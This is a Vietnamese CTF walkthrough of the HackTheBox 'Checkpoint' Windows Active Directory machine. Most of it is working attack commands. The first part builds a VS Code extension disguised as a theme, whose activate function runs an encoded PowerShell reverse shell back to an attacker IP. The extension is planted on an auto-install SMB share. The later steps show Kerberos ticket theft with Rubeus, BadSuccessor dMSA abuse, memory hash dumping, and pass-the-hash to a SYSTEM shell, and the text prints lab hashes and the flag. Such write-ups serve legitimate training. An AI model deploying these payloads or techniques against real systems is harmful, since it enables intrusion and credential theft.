# HackTheBox - Checkpoint (Season 11) Writeup

![HTB](https://img.shields.io/badge/HackTheBox-Checkpoint-green?style=for-the-badge&logo=hackthebox)
![Hard](https://img.shields.io/badge/Difficulty-Hard-orange?style=for-the-badge)
![Windows](https://img.shields.io/badge/OS-Windows-blue?style=for-the-badge&logo=windows)

Dưới đây là chi tiết các bước khai thác machine Checkpoint dựa trên các câu lệnh đã thực hiện thành công, kèm theo giải thích chi tiết cho từng thao tác.

---

## Giai Đoạn 1: Initial Access (Tấn Công Chuỗi Cung Ứng VSIX)

### Step 1: Setup hosts + sync time

```bash
sudo sed -i '/checkpoint.htb/d' /etc/hosts
echo "10.129.7.101 checkpoint.htb dc01.checkpoint.htb dc01" | sudo tee -a /etc/hosts
sudo ntpdate -u 10.129.7.101
```
* **Giải thích:**
  * Lệnh `sed` xóa các dòng cũ liên quan đến `checkpoint.htb` trong file `/etc/hosts` để tránh xung đột IP cũ.
  * Lệnh `echo` thêm IP mới `10.129.7.101` trỏ về các tên miền của mục tiêu. Việc phân giải đúng tên miền (Domain Name Resolution) là bắt buộc trong môi trường Active Directory (AD).
  * Lệnh `ntpdate` đồng bộ thời gian của máy Kali với máy chủ AD (DC). Kerberos yêu cầu thời gian giữa client và server không được lệch quá 5 phút (tránh lỗi Clock Skew), nếu không các request xác thực sẽ bị từ chối.

### Step 2: Restore mark.davies + enable

Khôi phục tài khoản `mark.davies` từ AD Recycle Bin và kích hoạt lại:

```bash
bloodyAD -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb --host 10.129.7.101 --dns 10.129.7.101 set restore 'CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb'

bloodyAD -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb --host 10.129.7.101 --dns 10.129.7.101 remove uac mark.davies -f ACCOUNTDISABLE
```
* **Giải thích:**
  * Ta sử dụng thông tin đăng nhập của `alex.turner` (đã biết từ việc liệt kê trước đó) để tương tác với LDAP/AD qua công cụ `bloodyAD`.
  * `set restore`: Khôi phục lại đối tượng `Mark Davies` đã bị xóa (nằm trong thùng rác `Deleted Objects` của AD) dựa vào chuỗi định danh (GUID).
  * `remove uac ... -f ACCOUNTDISABLE`: Sau khi khôi phục, tài khoản thường ở trạng thái vô hiệu hóa (Disabled). Lệnh này xóa cờ vô hiệu hóa trong thuộc tính `UserAccountControl` (UAC) để tài khoản `mark.davies` có thể đăng nhập bình thường.

### Step 3: Tạo VSIX (IP attacker 10.10.14.186)

Tạo một extension VS Code độc hại chứa PowerShell reverse shell. Máy mục tiêu có cấu hình một tiến trình tự động (Scheduled Task) quét và cài đặt các tệp `.vsix` từ thư mục chia sẻ `DevDrop`. Ta lợi dụng cơ chế này để chạy mã độc (Supply Chain Attack).

```bash
rm -rf /tmp/evil-ext /tmp/evil-ext.vsix
mkdir -p /tmp/evil-ext/extension

cat > /tmp/evil-ext/extension/package.json << 'EOF'
{"name":"checkpoint-theme","displayName":"Checkpoint Theme","description":"A beautiful theme","version":"1.0.0","engines":{"vscode":"^1.118.0"},"categories":["Themes"],"activationEvents":["*"],"main":"./extension.js"}
EOF
```
* **Giải thích:** Tạo cấu trúc thư mục chuẩn cho extension VS Code. File `package.json` định nghĩa các thông tin meta. Cờ `"activationEvents":["*"]` đảm bảo extension tự động kích hoạt ngay khi VS Code khởi chạy (hoặc khi được cài đặt), và sẽ gọi file `./extension.js`.

```bash
PAYLOAD=$(echo -n '$client = New-Object System.Net.Sockets.TCPClient("10.10.14.186",9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -t utf-16le | base64 -w 0)

cat > /tmp/evil-ext/extension/extension.js << EOF
const{exec}=require('child_process');function activate(){exec('powershell -nop -w hidden -e ${PAYLOAD}');}function deactivate(){}module.exports={activate,deactivate};
EOF
```
* **Giải thích:**
  * Lệnh `PAYLOAD=...`: Tạo một Reverse Shell bằng PowerShell (kết nối về IP `10.10.14.186` qua port `9001`). Mã này được mã hóa Base64 theo định dạng Unicode/UTF-16LE (`iconv -t utf-16le`) — định dạng chuẩn để chạy tham số `-e` (EncodedCommand) của PowerShell nhằm né tránh việc xử lý các ký tự đặc biệt.
  * File `extension.js`: Là file logic chính của extension. Khi kích hoạt (`activate`), nó sử dụng module `child_process` của NodeJS để thực thi ngầm đoạn PowerShell đã bị mã hóa ở trên (`powershell -nop -w hidden -e ...`).

```bash
cat > /tmp/evil-ext/'[Content_Types].xml' << 'EOF'
<?xml version="1.0" encoding="utf-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension=".json" ContentType="application/json"/><Default Extension=".js" ContentType="application/javascript"/><Default Extension=".vsixmanifest" ContentType="text/xml"/></Types>
EOF

cat > /tmp/evil-ext/extension.vsixmanifest << 'EOF'
<?xml version="1.0" encoding="utf-8"?><PackageManifest Version="2.0.0" xmlns="http://schemas.microsoft.com/developer/vsx-schema/2011"><Metadata><Identity Language="en-US" Id="checkpoint-theme" Version="1.0.0" Publisher="checkpoint"/><DisplayName>Checkpoint Theme</DisplayName><Description>A beautiful theme</Description></Metadata><Installation><InstallationTarget Id="Microsoft.VisualStudio.Code"/></Installation><Dependencies/><Assets><Asset Type="Microsoft.VisualStudio.Code.Manifest" Path="extension/package.json"/></Assets></PackageManifest>
EOF

cd /tmp/evil-ext && zip -r /tmp/evil-ext.vsix . && cd ~/Checkpoint_htb
echo "[+] VSIX ready"
```
* **Giải thích:** Hoàn thiện các file XML cấu hình bắt buộc (`[Content_Types].xml` và `extension.vsixmanifest`) để đóng gói chuẩn định dạng VS Code. Sau đó, nén tất cả lại (`zip -r`) thành tệp `evil-ext.vsix`. Thực chất file VSIX chỉ là một kho lưu trữ dạng nén (ZIP).

### Step 4: Terminal 1 - Listener

Mở listener chờ shell kết nối về:

```bash
nc -nlvp 9001
```
* **Giải thích:** Sử dụng Netcat để lắng nghe các kết nối đến port `9001`. Khi mục tiêu chạy reverse shell, nó sẽ gọi ngược về đây và cấp cho ta quyền điều khiển.

### Step 5: Terminal 2 - Upload

Upload file extension lên thư mục chia sẻ `DevDrop`:

```bash
smbclient //10.129.7.101/DevDrop -U 'checkpoint.htb/mark.davies%Checkpoint2024!' -c 'put /tmp/evil-ext.vsix checkpoint-theme.vsix'
```
* **Giải thích:** Kết nối vào giao thức chia sẻ file SMB của máy mục tiêu bằng tài khoản `mark.davies` (vừa được khôi phục ở Step 2). Đẩy (`put`) file extension độc hại vào thư mục `DevDrop`. Ngay khi file có mặt ở đây, hệ thống mục tiêu sẽ quét, tự động cài đặt và chạy payload. Bạn sẽ nhận được shell với quyền của user `ryan.brooks`.

---

## Giai Đoạn 2: Privilege Escalation (BadSuccessor & Memory Forensics)

### Bước 1: Enumeration trên shell (ryan.brooks)

Chạy các lệnh sau trong shell PowerShell vừa chiếm được để thu thập thông tin:

```powershell
whoami /groups
net user ryan.brooks /domain
dir \\DC01\VMBackups
```
* **Giải thích:**
  * `whoami /groups`: Xem các nhóm mà `ryan.brooks` thuộc về.
  * `net user ...`: Kiểm tra thông tin domain của tài khoản.
  * `dir \\DC01\VMBackups`: Phát hiện mục tiêu có một thư mục chia sẻ ngầm là `VMBackups` (nơi lưu trữ các bản backup máy ảo). Nhưng hiện tại ta chưa có quyền truy cập.

### Bước 2: BadSuccessor Enumeration (trên máy Kali/attacker)

Sử dụng `NetExec (nxc)` với module `badsuccessor` để scan lỗ hổng:

```bash
nxc ldap checkpoint.htb -u alex.turner -p 'Checkpoint2024!' -M badsuccessor
```
* **Giải thích:** `badsuccessor` là một mô-đun của NetExec để dò quét lỗi cấu hình uỷ quyền trong AD.
> **NOTE:** BadSuccessor là một kỹ thuật tấn công Privilege Escalation khai thác cấu hình dMSA (delegated Managed Service Account) trong Active Directory. Bằng cách thao túng các tài khoản dMSA, kẻ tấn công có thể giả mạo (impersonate) quyền hạn của các tài khoản khác.

### Bước 3: Upload Rubeus lên target

**3a. Host Rubeus trên máy attacker:**
Trên máy Kali, host file `rubeus.exe` qua HTTP:

```bash
# Mở HTTP server (nếu chưa có)
python3 -m http.server 8181
```

**3b. Download Rubeus trên target:**
Trong shell PowerShell trên target:

```powershell
Invoke-WebRequest -Uri 'http://10.10.14.114:8181/rubeus.exe' -OutFile C:\Windows\Temp\rubeus.exe
```
* **Giải thích:** `Rubeus` là một công cụ mạnh mẽ viết bằng C# dùng để tương tác và tấn công giao thức xác thực Kerberos. Bước này ta truyền nó vào thư mục tạm (`Temp`) trên máy mục tiêu.

### Bước 4: Lấy TGT bằng Rubeus (trên target)

Do môi trường reverse shell đôi khi làm mất output (không trả về gì cả) khi độ dài chuỗi base64 quá lớn, ta cần chuyển hướng kết quả vào một file text để đọc:

```powershell
C:\Windows\Temp\rubeus.exe tgtdeleg /nowrap > C:\Windows\Temp\tgt.txt
type C:\Windows\Temp\tgt.txt
```
* **Giải thích:** Lệnh `tgtdeleg` lợi dụng giao thức ủy quyền (delegation) để trích xuất Ticket-Granting Ticket (TGT) của user hiện tại (`ryan.brooks`) từ bộ nhớ máy tính mà không cần đặc quyền Administrator. TGT này có thể được dùng để yêu cầu các vé truy cập (TGS) khác trong toàn mạng. Tham số `/nowrap` yêu cầu in toàn bộ chuỗi base64 trên 1 dòng để dễ copy. Việc redirect `> C:\Windows\Temp\tgt.txt` giúp tránh lỗi mất output trong reverse shell.

### Bước 5: Convert Ticket (trên máy Kali/attacker)

**5a. Sync time với DC:**
```bash
sudo ntpdate -b checkpoint.htb
```

**5b. Lưu base64 ticket và decode:**
```bash
# Paste chuỗi base64 từ Rubeus vào file
echo '<BASE64_TICKET_STRING>' > /tmp/ryan.kirbi.b64

# Decode base64 → .kirbi
base64 -d /tmp/ryan.kirbi.b64 > /tmp/ryan2.kirbi
```

**5c. Convert .kirbi → .ccache (Impacket format):**
```bash
impacket-ticketConverter /tmp/ryan2.kirbi /tmp/ryan2.ccache
```

**5d. Set Kerberos credential cache:**
```bash
export KRB5CCNAME=/tmp/ryan2.ccache
```
* **Giải thích:**
  * Rubeus cung cấp vé ở định dạng Windows (`.kirbi`), nhưng các công cụ tấn công trên Linux (như Impacket, bloodyAD) sử dụng định dạng `.ccache`.
  * Lệnh `impacket-ticketConverter` thực hiện việc chuyển đổi định dạng này.
  * Việc gán biến môi trường `KRB5CCNAME` báo cho hệ thống (và các công cụ) biết hãy dùng vé `.ccache` này để xác thực Kerberos thay vì hỏi password. Gọi là kỹ thuật **Pass-the-Ticket (PtT)**.

### Bước 6: Khai thác BadSuccessor với bloodyAD

**6a. Kiểm tra quyền writable:**
```bash
bloodyAD -k ccache=/tmp/ryan2.ccache \
  --dc-ip 10.129.18.33 \
  --host dc01.checkpoint.htb \
  -d checkpoint.htb \
  get writable --right WRITE
```
* **Giải thích:** Với vé TGT của `ryan.brooks` (tham số `-k`), ta dùng `bloodyAD` để truy vấn LDAP xem tài khoản này có quyền Ghi (WRITE) lên những đối tượng nào trong hệ thống mạng. Kết quả trả về cho thấy ta có quyền sửa đổi tài khoản `svc_deploy` (`CN=svc_deploy,OU=ServiceAccounts...`).

**6b. Exploit BadSuccessor để lấy hash svc_deploy:**
Tạo dMSA khai thác BadSuccessor để mạo danh (impersonate) `svc_deploy`:

```bash
bloodyAD -k ccache=/tmp/ryan2.ccache \
  -u ryan.brooks \
  --dc-ip 10.129.18.33 \
  --host dc01.checkpoint.htb \
  -d checkpoint.htb \
  add badSuccessor evilDMSA3 \
  -t 'CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb' \
  --ou 'OU=dMSAHolder,DC=checkpoint,DC=htb'
```
* **Giải thích:**
  * Lệnh này tạo một tài khoản dMSA giả mạo tên là `evilDMSA3` và lợi dụng quyền WRITE đang có đối với mục tiêu (`-t svc_deploy`) để "ép" hệ thống tin rằng `evilDMSA3` được quyền hoạt động dưới danh tính của `svc_deploy`.
  * Sau khi khai thác thành công, bloodyAD tự động trích xuất các khóa xác thực (TGS keys). Khóa dạng RC4 thực chất chính là NTLM Hash của tài khoản `svc_deploy`: `e16081eb077aca74bdbf8af12af43ac9`.

### Bước 7: Trích xuất Memory Dump từ VMBackups

Dùng hash của `svc_deploy` kết nối vào share `VMBackups` với timeout cao để tải file snapshot (dung lượng lớn):

```bash
smbclient //checkpoint.htb/VMBackups \
  -U 'checkpoint.htb\svc_deploy' \
  --pw-nt-hash e16081eb077aca74bdbf8af12af43ac9 \
  -t 600
```
* **Giải thích:** Kỹ thuật **Pass-the-Hash (PtH)**: Dùng hàm băm NTLM `--pw-nt-hash` thay vì password plaintext để đăng nhập. Tài khoản `svc_deploy` có quyền truy cập ổ đĩa chia sẻ `VMBackups`. Tham số `-t 600` (timeout 600 giây) để smbclient không ngắt kết nối giữa chừng khi tải các file quá nặng.

Trong smbclient:
```
smb: \> cd "NightlyBackup_2024-11-01\memory forensics"
smb: \> get "Windows Server 2019-Snapshot1.vmsn"
smb: \> get "Windows Server 2019-Snapshot1.vmem"
```
* **Giải thích:** Ta tải về bản sao lưu bộ nhớ máy ảo (`.vmem` - file chứa toàn bộ nội dung RAM của hệ thống tại thời điểm backup) và tệp trạng thái (`.vmsn`). File RAM này chứa rất nhiều dữ liệu nhạy cảm, bao gồm cả mật khẩu và mã băm của quản trị viên.

### Bước 8: Memory Forensics (Lấy hash Administrator)

Phân tích bộ nhớ bằng Volatility 3:

```bash
vol -f "Windows Server 2019-Snapshot1.vmem" windows.hashdump
```
* **Giải thích:** `Volatility 3` là framework chuyên dụng cho Memory Forensics. Plugin `windows.hashdump` sẽ dò quét toàn bộ mảng RAM (2GB file .vmem) để trích xuất khoá mã hoá SAM và SYSTEM, từ đó giải mã ra được NTLM Hash của tất cả các user đã đăng nhập.
* **Kết quả:** Ta lấy được hash của `Administrator`: `f29e9c014295b9b32139b09a2790be3b`

### Bước 9: Đọc root flag (Pass-the-Hash)

Sử dụng `impacket-psexec` (hoặc `evil-winrm`) để đăng nhập với hash vừa lấy được:

```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:f29e9c014295b9b32139b09a2790be3b checkpoint.htb/administrator@dc01.checkpoint.htb
```
* **Giải thích:** Kỹ thuật **Pass-the-Hash (-hashes)** cho phép ta lấy shell NT AUTHORITY\SYSTEM thông qua dịch vụ SMB (psexec) mà không cần mật khẩu gốc.

Sau khi có shell Admin, nếu ta thử đọc file theo cách thông thường:
```cmd
C:\Windows\System32> type C:\Users\Administrator\Desktop\root.txt
The system cannot find the file specified.
```
* **Giải thích:** Đây là một "cú lừa" (rabbit hole) phổ biến trên HackTheBox. Cờ `root.txt` không nằm ở thư mục của Administrator. Ta cần tìm kiếm nó trên toàn bộ hệ thống hoặc trong thư mục của các user khác.

**Tìm kiếm root flag:**
```cmd
# Quét toàn bộ ổ C: (mất chút thời gian)
dir /s /b C:\root.txt

# Hoặc kiểm tra các thư mục user (ví dụ max.palmer, alex.turner)
dir C:\Users
dir C:\Users\max.palmer\Desktop
```

Hóa ra cờ được giấu trong Desktop của user `max.palmer`. Ta có thể đọc trực tiếp trong shell psexec hiện tại:
```cmd
type C:\Users\max.palmer\Desktop\root.txt
```

Hoặc nếu lỡ thoát shell, có thể dùng `NetExec (nxc)` để thực thi lệnh đọc (wmiexec):
```bash
nxc smb 10.129.18.33 \
  -u Administrator \
  -H f29e9c014295b9b32139b09a2790be3b \
  -x 'type C:\Users\max.palmer\Desktop\root.txt'
```

Kết quả trả về mã MD5 của cờ:
```
8dd1cea3f79aa935cd4e853fb134e318
```

🎉 **Chúc mừng bạn đã hoàn thành bài Lab Checkpoint!** 🏴
